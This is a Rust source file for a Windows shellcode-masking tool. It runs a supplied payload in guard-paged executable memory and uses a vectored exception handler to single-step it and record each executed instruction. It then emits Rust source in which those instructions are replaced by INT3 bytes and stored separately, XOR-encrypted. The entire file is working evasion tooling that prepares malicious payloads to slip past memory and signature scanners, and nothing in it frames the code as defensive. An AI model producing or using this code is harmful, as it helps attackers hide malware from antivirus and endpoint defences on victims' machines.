use clap::Parser;
use rand::Rng;
use std::collections::HashMap;
use std::error::Error;
use std::ffi::c_void;
use std::fs::File;
use std::io::{Read, Write};
use std::ptr;
use windows::Win32::Foundation::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
use windows::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, EXCEPTION_POINTERS, STATUS_GUARD_PAGE_VIOLATION,
    EXCEPTION_SINGLE_STEP,
};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE, PAGE_GUARD,
};
use windows::Win32::System::Threading::{CreateThread, TerminateThread};

// Global state for the VEH handler
static mut PAYLOAD_BASE: *mut c_void = ptr::null_mut();
static mut PAYLOAD_SIZE: usize = 0;
static mut PAYLOAD_EXECUTED_ASM: Option<HashMap<usize, Vec<u8>>> = None;
static mut DECODER: Option<zydis::Decoder> = None;

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    #[clap(short, long, value_parser)]
    payload: String,
    #[clap(short, long, value_parser)]
    output: String,
    #[clap(short, long, value_parser)]
    args: Option<String>,
}

unsafe extern "system" fn veh_page_guard(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let exception_record = &*(*exception_info).ExceptionRecord;
        let context_record = &mut *(*exception_info).ContextRecord;

        match exception_record.ExceptionCode.0 as u32 {
            STATUS_GUARD_PAGE_VIOLATION => {
                if exception_record.ExceptionInformation[0] as u32 == 8 {
                    let rip = context_record.Rip as *const u8;
                    let offset = rip as usize - PAYLOAD_BASE as usize;

                    let executed_asm = PAYLOAD_EXECUTED_ASM.as_mut().unwrap();
                    if !executed_asm.contains_key(&offset) {
                        let decoder = DECODER.as_ref().unwrap();
                        let code_slice = std::slice::from_raw_parts(rip, 15);

                        if let Ok(Some(instruction)) = decoder.decode_first::<zydis::VisibleOperands>(code_slice) {
                            let instruction_len = instruction.length as usize;
                            let instruction_bytes =
                                std::slice::from_raw_parts(rip, instruction_len).to_vec();
                            executed_asm.insert(offset, instruction_bytes);
                        }
                    }
                }
                context_record.EFlags |= 0x100;
                EXCEPTION_CONTINUE_EXECUTION.0
            }
            EXCEPTION_SINGLE_STEP => {
                let mut old_protect = 0;
                VirtualProtect(
                    PAYLOAD_BASE,
                    PAYLOAD_SIZE,
                    PAGE_EXECUTE_READWRITE | PAGE_GUARD,
                    &mut old_protect,
                );
                EXCEPTION_CONTINUE_EXECUTION.0
            }
            _ => EXCEPTION_CONTINUE_SEARCH.0,
        }
    }
}

fn generate_output_file(
    output_path: &str,
    payload: Vec<u8>,
    executed_asm: &HashMap<usize, Vec<u8>>,
) -> Result<(), Box<dyn Error>> {
    let mut rng = rand::thread_rng();
    let key: Vec<u8> = (0..16).map(|_| rng.gen_range(0..=255)).collect();

    let mut masked_payload = payload.clone();
    for (offset, instruction) in executed_asm {
        for i in 0..instruction.len() {
            masked_payload[*offset + i] = 0xcc; // INT3
        }
    }

    let mut encrypted_asm = HashMap::new();
    for (offset, instruction) in executed_asm {
        let mut encrypted_instruction = instruction.clone();
        for i in 0..instruction.len() {
            encrypted_instruction[i] ^= key[i % key.len()];
        }
        encrypted_asm.insert(*offset, encrypted_instruction);
    }

    let mut file = File::create(output_path)?;

    writeln!(file, "use std::collections::HashMap;")?;
    writeln!(file, "")?;
    writeln!(file, "pub const MASKED_PAYLOAD: &[u8] = &[")?;
    for (i, byte) in masked_payload.iter().enumerate() {
        if i % 16 == 0 {
            write!(file, "    ")?;
        }
        write!(file, "0x{:02x}, ", byte)?;
        if i % 16 == 15 {
            writeln!(file)?;
        }
    }
    writeln!(file, "];")?;
    writeln!(file, "")?;

    writeln!(file, "pub const XOR_KEY: &[u8] = &[")?;
    for (i, byte) in key.iter().enumerate() {
        if i % 16 == 0 {
            write!(file, "    ")?;
        }
        write!(file, "0x{:02x}, ", byte)?;
    }
    writeln!(file, "];")?;
    writeln!(file, "")?;

    writeln!(file, "pub fn init_map() -> HashMap<usize, Vec<u8>> {{")?;
    writeln!(file, "    let mut map = HashMap::new();")?;
    for (offset, instruction) in &encrypted_asm {
        write!(file, "    map.insert({}, vec![", offset)?;
        for (i, byte) in instruction.iter().enumerate() {
            write!(file, "0x{:02x}", byte)?;
            if i < instruction.len() - 1 {
                write!(file, ", ")?;
            }
        }
        writeln!(file, "]);")?;
    }
    writeln!(file, "    map")?;
    writeln!(file, "}}")?;

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();

    let mut payload_file = File::open(&args.payload)?;
    let mut payload = Vec::new();
    payload_file.read_to_end(&mut payload)?;
    println!("[~] LOG - Read {} bytes from {}", payload.len(), &args.payload);

    unsafe {
        PAYLOAD_SIZE = payload.len();
        PAYLOAD_EXECUTED_ASM = Some(HashMap::new());
        DECODER = Some(zydis::Decoder::new(zydis::MachineMode::LONG_64, zydis::StackWidth::_64).unwrap());

        PAYLOAD_BASE = VirtualAlloc(
            ptr::null_mut(),
            PAYLOAD_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if PAYLOAD_BASE.is_null() {
            return Err("Failed to allocate memory for payload".into());
        }
        println!("[~] LOG - Allocated memory for payload at {:?}", PAYLOAD_BASE);

        ptr::copy_nonoverlapping(payload.as_ptr(), PAYLOAD_BASE as *mut u8, PAYLOAD_SIZE);
        println!("[~] LOG - Copied payload to allocated memory");

        let mut old_protect = 0;
        if !VirtualProtect(
            PAYLOAD_BASE,
            PAYLOAD_SIZE,
            PAGE_EXECUTE_READWRITE | PAGE_GUARD,
            &mut old_protect,
        ).as_bool()
        {
            return Err("Failed to set PAGE_GUARD protection".into());
        }
        println!("[~] LOG - Set PAGE_GUARD protection on payload memory");

        if AddVectoredExceptionHandler(1, Some(veh_page_guard)).is_null() {
            return Err("Failed to install VEH".into());
        }
        println!("[~] LOG - Installed VEH");

        println!("[~] LOG - Creating new thread on the payload...");
        let thread_handle = CreateThread(
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(PAYLOAD_BASE)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        )?;

        println!("[~] LOG - ...WAITING-FOR-STOP-SIGNAL...");
        println!("Press Enter to stop the recording of the payload execution and start generating the final output file.");

        let mut buffer = String::new();
        std::io::stdin().read_line(&mut buffer)?;

        TerminateThread(thread_handle, 0)?;
        println!("[~] LOG - Stopped payload thread.");

        println!(
            "[~] LOG - Writing the generated Rust source file to the output path of {}",
            &args.output
        );

        generate_output_file(
            &args.output,
            payload,
            PAYLOAD_EXECUTED_ASM.as_ref().unwrap(),
        )?;

        println!("[+] SUCCESS - Rust source file successfully written on disk!");
        println!("[+] SUCCESS - Program executed successfully!");

        VirtualFree(PAYLOAD_BASE, 0, MEM_RELEASE)?;
    }

    Ok(())
}
